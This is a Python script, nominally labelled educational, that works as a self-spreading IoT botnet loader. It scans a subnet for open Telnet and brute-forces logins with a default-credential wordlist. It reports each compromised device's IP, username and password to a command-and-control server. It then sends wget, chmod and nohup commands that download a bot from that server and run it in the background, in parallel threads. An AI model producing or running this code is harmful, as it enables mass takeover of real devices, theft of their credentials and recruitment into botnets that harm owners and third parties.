#!/usr/bin/env python3
"""
IoT Security Research - Device Scanner and Exploitation
Educational Purpose Only - For Controlled Lab Environment
"""

import nmap
import telnetlib
import requests
import threading
import subprocess
import time
import os
import json
from concurrent.futures import ThreadPoolExecutor
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('threat_actor.log'),
        logging.StreamHandler()
    ]
)

class IoTExploiter:
    def __init__(self, cnc_server_ip, subnet="192.168.1.0/24"):
        self.cnc_server_ip = cnc_server_ip
        self.subnet = subnet
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.http_server_port = 8000
        self.bot_script = "bot_client.py"
        
        # Extended credential wordlist for IoT devices
        self.credentials = [
            # Default credentials
            ("admin", "admin"),
            ("root", "root"),
            ("root", "toor"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "12345"),
            ("admin", ""),
            ("root", ""),
            ("user", "user"),
            ("guest", "guest"),
            
            # IoT specific credentials
            ("iot", "iot"),
            ("iot", "1234"),
            ("raspberry", "raspberry"),
            ("pi", "raspberry"),
            ("ubuntu", "ubuntu"),
            ("admin", "1234"),
            ("support", "support"),
            ("service", "service"),
            ("administrator", "administrator"),
            ("admin", "admin123"),
            ("root", "123456"),
            ("ipcamadmin", "admin"),
            ("temphumidadmin", "admin"),
            
            # Common IoT device credentials
            ("admin", "admin123"),
            ("admin", "admin@123"),
            ("admin", "admin1234"),
            ("admin", "admin@1234"),
            ("admin", "admin!@#"),
            ("admin", "admin!@#$"),
            ("admin", "admin!@#$%"),
            ("admin", "admin!@#$%^"),
            ("admin", "admin!@#$%^&"),
            ("admin", "admin!@#$%^&*"),
            
            # Empty credentials
            ("", ""),
            ("admin", ""),
            ("root", ""),
            ("user", ""),
            ("guest", ""),
            
            # Common patterns
            ("admin", "admin123"),
            ("admin", "admin1234"),
            ("admin", "admin12345"),
            ("admin", "admin123456"),
            ("admin", "admin1234567"),
            ("admin", "admin12345678"),
            ("admin", "admin123456789"),
            ("admin", "admin1234567890"),
        ]
        
        self.successful_exploits = []
        self.failed_attempts = []
        self.scan_results = {}
        
        # Create results directory if it doesn't exist
        os.makedirs('results', exist_ok=True)
    
    def scan_network(self):
        """Scan network for devices with Telnet open"""
        logging.info(f"Starting network scan on {self.subnet}")
        
        try:
            scanner = nmap.PortScanner()
            
            # First quick scan for open ports
            logging.info("Performing initial quick scan...")
            scanner.scan(
                hosts=self.subnet,
                arguments='-sn -T4'  # Quick ping scan
            )
            
            active_hosts = scanner.all_hosts()
            logging.info(f"Found {len(active_hosts)} active hosts")
            
            # Detailed scan of active hosts
            logging.info("Performing detailed port scan...")
            scanner.scan(
                hosts=active_hosts,
                arguments='-p 23,80,443,1883,8883,8080 -sV -T4'  # Common IoT ports
            )
            
            telnet_hosts = []
            for host in scanner.all_hosts():
                if scanner[host].has_tcp(23) and scanner[host]['tcp'][23]['state'] == 'open':
                    service_info = scanner[host]['tcp'][23]
                    telnet_hosts.append({
                        'ip': host,
                        'service': service_info.get('name', 'unknown'),
                        'product': service_info.get('product', 'unknown'),
                        'version': service_info.get('version', 'unknown')
                    })
                    logging.info(f"Found Telnet service on: {host} ({service_info.get('product', 'unknown')})")
            
            self.scan_results = {
                'timestamp': datetime.now().isoformat(),
                'subnet': self.subnet,
                'active_hosts': len(active_hosts),
                'telnet_hosts': telnet_hosts
            }
            
            # Save scan results
            with open('results/scan_results.json', 'w') as f:
                json.dump(self.scan_results, f, indent=4)
            
            logging.info(f"Network scan complete. Found {len(telnet_hosts)} devices with Telnet")
            return telnet_hosts
            
        except Exception as e:
            logging.error(f"Network scan failed: {e}")
            return []
    
    def attempt_telnet_login(self, ip, username, password, timeout=10):
        """Attempt to login via Telnet with given credentials"""
        try:
            logging.info(f"Attempting login: {ip} with {username}:{password}")
            
            tn = telnetlib.Telnet(ip, 23, timeout=timeout)
            
            # Handle different login prompts
            login_prompts = [b"login:", b"Login:", b"Username:", b"username:", b"user:", b"User:"]
            password_prompts = [b"Password:", b"password:", b"Pass:", b"pass:"]
            
            # Wait for login prompt
            index, match, data = tn.expect(login_prompts, timeout=5)
            if index == -1:
                tn.close()
                return None
            
            # Send username
            tn.write(username.encode('ascii') + b"\n")
            
            # Wait for password prompt
            index, match, data = tn.expect(password_prompts, timeout=5)
            if index == -1:
                tn.close()
                return None
            
            # Send password
            tn.write(password.encode('ascii') + b"\n")
            
            # Check for successful login
            time.sleep(2)
            response = tn.read_very_eager().decode('ascii', errors='ignore')
            
            # Common failure indicators
            failure_indicators = [
                "incorrect", "failed", "denied", "invalid", 
                "login:", "username:", "password:", "try again",
                "access denied", "authentication failed"
            ]
            
            if any(indicator in response.lower() for indicator in failure_indicators):
                tn.close()
                return None
            
            logging.info(f"âœ“ Successful login: {ip} with {username}:{password}")
            return tn
            
        except Exception as e:
            logging.error(f"Login attempt failed for {ip}: {e}")
            return None
    
    def register_compromised_device(self, ip, username, password):
        """Register compromised device with C&C server"""
        try:
            response = requests.post(
                f"{self.cnc_url}/register-device",
                json={
                    "ip": ip,
                    "username": username,
                    "password": password,
                    "timestamp": datetime.now().isoformat()
                },
                timeout=10
            )
            
            if response.status_code == 200:
                logging.info(f"Device {ip} registered with C&C server")
                return True
            else:
                logging.error(f"Failed to register {ip} with C&C: {response.text}")
                return False
                
        except Exception as e:
            logging.error(f"Failed to register device {ip}: {e}")
            return False
    
    def start_http_server(self):
        """Start HTTP server to serve bot payload"""
        try:
            # Ensure bot script exists
            if not os.path.exists(self.bot_script):
                logging.error(f"Bot script {self.bot_script} not found!")
                return False
            
            # Start HTTP server in background
            cmd = f"python3 -m http.server {self.http_server_port}"
            subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(2)  # Give server time to start
            logging.info(f"HTTP server started on port {self.http_server_port}")
            return True
            
        except Exception as e:
            logging.error(f"Failed to start HTTP server: {e}")
            return False
    
    def deploy_bot(self, ip, telnet_session):
        """Deploy bot payload to compromised device"""
        try:
            logging.info(f"Deploying bot to {ip}")
            
            # Commands to download and execute bot
            download_cmd = f"wget http://{self.cnc_server_ip}:{self.http_server_port}/{self.bot_script} -O /tmp/{self.bot_script}"
            chmod_cmd = f"chmod +x /tmp/{self.bot_script}"
            execute_cmd = f"nohup python3 /tmp/{self.bot_script} {self.cnc_server_ip} > /dev/null 2>&1 &"
            
            # Send commands
            telnet_session.write(download_cmd.encode('ascii') + b"\n")
            time.sleep(3)
            
            telnet_session.write(chmod_cmd.encode('ascii') + b"\n")
            time.sleep(1)
            
            telnet_session.write(execute_cmd.encode('ascii') + b"\n")
            time.sleep(2)
            
            # Clean up
            telnet_session.write(b"exit\n")
            telnet_session.close()
            
            logging.info(f"âœ“ Bot deployed successfully to {ip}")
            return True
            
        except Exception as e:
            logging.error(f"Failed to deploy bot to {ip}: {e}")
            return False
    
    def exploit_device(self, device_info):
        """Attempt to exploit a single device"""
        ip = device_info['ip']
        
        for username, password in self.credentials:
            telnet_session = self.attempt_telnet_login(ip, username, password)
            
            if telnet_session:
                # Register with C&C
                if self.register_compromised_device(ip, username, password):
                    # Deploy bot
                    if self.deploy_bot(ip, telnet_session):
                        self.successful_exploits.append({
                            'ip': ip,
                            'username': username,
                            'password': password,
                            'service': device_info.get('service', 'unknown'),
                            'product': device_info.get('product', 'unknown'),
                            'version': device_info.get('version', 'unknown'),
                            'timestamp': datetime.now().isoformat()
                        })
                        return True
                else:
                    telnet_session.close()
                
                break  # Stop trying other credentials if one works
        
        self.failed_attempts.append({
            'ip': ip,
            'timestamp': datetime.now().isoformat()
        })
        return False
    
    def run_exploitation(self, max_threads=10):
        """Run the complete exploitation process"""
        logging.info("="*50)
        logging.info("Starting IoT Device Exploitation")
        logging.info("Educational Research Purpose Only")
        logging.info("="*50)
        
        # Step 1: Start HTTP server
        if not self.start_http_server():
            logging.error("Failed to start HTTP server. Aborting.")
            return
        
        # Step 2: Scan network
        target_hosts = self.scan_network()
        
        if not target_hosts:
            logging.warning("No target hosts found. Exiting.")
            return
        
        # Step 3: Exploit devices in parallel
        logging.info(f"Starting exploitation of {len(target_hosts)} devices")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(self.exploit_device, target_hosts)
        
        # Step 4: Print results
        self.print_results()
        
        # Step 5: Save results
        self.save_results()
    
    def print_results(self):
        """Print exploitation results"""
        logging.info("\n" + "="*50)
        logging.info("Exploitation Results")
        logging.info("="*50)
        
        logging.info(f"\nSuccessful Exploits: {len(self.successful_exploits)}")
        for exploit in self.successful_exploits:
            logging.info(f"âœ“ {exploit['ip']} - {exploit['username']}:{exploit['password']}")
        
        logging.info(f"\nFailed Attempts: {len(self.failed_attempts)}")
        for attempt in self.failed_attempts:
            logging.info(f"âœ— {attempt['ip']}")
    
    def save_results(self):
        """Save exploitation results to file"""
        results = {
            'timestamp': datetime.now().isoformat(),
            'subnet': self.subnet,
            'scan_results': self.scan_results,
            'successful_exploits': self.successful_exploits,
            'failed_attempts': self.failed_attempts
        }
        
        with open('results/exploitation_results.json', 'w') as f:
            json.dump(results, f, indent=4)
        
        logging.info("\nResults saved to results/exploitation_results.json")

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='IoT Device Scanner and Exploiter')
    parser.add_argument('--cnc-ip', required=True, help='C&C Server IP address')
    parser.add_argument('--subnet', default='192.168.1.0/24', help='Target subnet (default: 192.168.1.0/24)')
    parser.add_argument('--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    
    args = parser.parse_args()
    
    exploiter = IoTExploiter(args.cnc_ip, args.subnet)
    exploiter.run_exploitation(args.threads)

if __name__ == "__main__":
    main()